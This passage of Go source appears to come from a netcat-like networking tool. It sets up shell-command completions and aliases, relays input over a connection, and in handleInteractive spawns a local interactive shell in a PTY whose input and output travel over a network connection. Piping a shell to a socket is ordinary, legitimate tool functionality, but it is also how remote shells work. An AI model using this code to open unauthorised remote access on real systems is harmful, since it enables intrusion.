		"bash", "sh", "zsh", "fish", "python", "python3", "perl", "ruby", "node",
		// Editors
		"vi", "vim", "nvim", "nano", "emacs", "ed",
		// Version control
		"git", "svn", "hg",
		// Containers
		"docker", "docker-compose", "podman", "kubectl", "helm",
		// Misc
		"exit", "quit", "logout", "clear", "reset", "history", "alias", "unalias",
		"export", "env", "printenv", "set", "unset", "source", "exec",
		"man", "info", "help", "apropos", "whatis",
		"sudo", "su", "passwd", "useradd", "userdel", "usermod", "groupadd",
		"mount", "umount", "fdisk", "mkfs", "fsck", "dd", "sync",
		"screen", "tmux", "byobu",
	}
	editor.SetCompletions(completions)

	// Add common aliases
	editor.AddAlias("ll", "ls -la")
	editor.AddAlias("la", "ls -a")
	editor.AddAlias("l", "ls -CF")
	editor.AddAlias("...", "cd ../..")
	editor.AddAlias("....", "cd ../../..")
	editor.AddAlias("ports", "netstat -tulanp")
	editor.AddAlias("myip", "curl -s ifconfig.me")

	// Read user input with readline and send to connection
	go func() {
		for {
			select {
			case <-done:
				return
			default:
				line, err := editor.Readline()
				if err != nil {
					if err == io.EOF || err.Error() == "interrupted" {
						return
					}
					if err == readline.ErrTerminated {
						closeDone()
						return
					}
					return
				}
				if runRelayShortcut(line, conn) {
					continue
				}
				if _, err := conn.Write([]byte(line + "\n")); err != nil {
					return
				}
			}
		}
	}()

	// Wait for connection to close
	<-done
	return nil
}

func handleInteractive(conn net.Conn) error {
	if blockSignals {
		signals.BlockExitSignals()
	}

	// Setup terminal for interactive mode on Unix systems
	if runtime.GOOS != "windows" {
		if termState, err := terminal.SetupTerminal(); err == nil && termState != nil {
			defer func() {
				if err := termState.Restore(); err != nil {
					logger.Error("Error restoring terminal state: %v", err)
				}
			}()
		} else if err != nil {
			logger.Debug("Terminal setup skipped: %v", err)
		}
	}

	// Create a PTY for better shell interaction
	shell := "/bin/sh"
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else if os.Getenv("SHELL") != "" {
		shell = os.Getenv("SHELL")
	}

	cmd := exec.Command(shell, "-i")
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("failed to start pty: %v", err)
	}
	defer func() {
		if err := ptmx.Close(); err != nil {
			logger.Error("Error closing pty: %v", err)
		}
	}()

	// Handle PTY size changes
	resizeDone := make(chan struct{})
	defer close(resizeDone)
	go func() {
		for {
			select {
			case <-resizeDone:
				return
			default:
				if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
					logger.Debug("error resizing pty: %v", err)
				}
				time.Sleep(100 * time.Millisecond)
			}
		}
	}()

	// Channel for PTY output
	ptyOutputChan := make(chan []byte, 100)
	ptyErrChan := make(chan error, 1)

	// Goroutine: PTY output -> connection
	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := ptmx.Read(buf)
			if err != nil {
				ptyErrChan <- err
				return
			}
			if n > 0 {
				// Send to connection
				if _, err := conn.Write(buf[:n]); err != nil {
					ptyErrChan <- err
					return
				}
				// Also buffer for potential display
				data := make([]byte, n)
				copy(data, buf[:n])
				select {
				case ptyOutputChan <- data:
				default:
					// Channel full, skip
				}
			}
		}
	}()

	// Goroutine: Connection output -> stdout (with optional CRLF)
	go func() {
		buf := make([]byte, 4096)
		var stdoutWriter io.Writer = os.Stdout
		if listenCRLFMode {
			logger.Debug("CRLF mode enabled in interactive: converting LF to CRLF")
			stdoutWriter = &crlfWriter{writer: os.Stdout}
		} else {
			stdoutWriter = ttyCRLFWriter(stdoutWriter)
		}

		for {
			n, err := conn.Read(buf)
			if err != nil {
				return
			}
			if n > 0 {
				stdoutWriter.Write(buf[:n])
			}
		}
	}()

	// Create readline editor for local input
	editor := readline.NewEditor()
	editor.SetPrompt("") // No visible prompt in PTY mode
	editor.EnableAutoSuggestion(false)

	// Set history file for interactive mode
	if homeDir, err := os.UserHomeDir(); err == nil {
		historyFile := homeDir + "/.gocat_interactive_history"
		editor.SetHistoryFile(historyFile)
	}

	// Read user input with readline -> PTY
	for {
		line, err := editor.Readline()
		if err == io.EOF {
			break
		}
		if err != nil {
			if err.Error() == "interrupted" {
				// Ctrl+C - send signal to PTY instead of exiting
				if _, writeErr := ptmx.Write([]byte{3}); writeErr != nil {
					return writeErr
				}
				continue
			}
			if err == readline.ErrTerminated {
				// SIGTERM/SIGHUP: unwind so defers restore the terminal.
				return nil
			}
			return fmt.Errorf("readline error: %v", err)
		}

		// Send command to PTY
		if _, err := ptmx.Write([]byte(line + "\n")); err != nil {
			return fmt.Errorf("failed to write to pty: %v", err)
		}
	}

	return nil
}

func handleLocalInteractive(conn net.Conn) error {
	// Wrap stdout with CRLF if enabled
	var stdoutWriter io.Writer = os.Stdout
	if listenCRLFMode {
		stdoutWriter = &crlfWriter{writer: os.Stdout}
	} else {
		stdoutWriter = ttyCRLFWriter(stdoutWriter)
	}

	// Done channel for clean shutdown
	done := make(chan struct{})

	// Goroutine: Read from connection and write to stdout
	go func() {
		io.Copy(stdoutWriter, conn)
		close(done)
	}()

	// Goroutine: Read from stdin and write to connection
	go func() {
		io.Copy(conn, os.Stdin)
	}()

	// Wait for connection to close
	<-done
	return nil
}
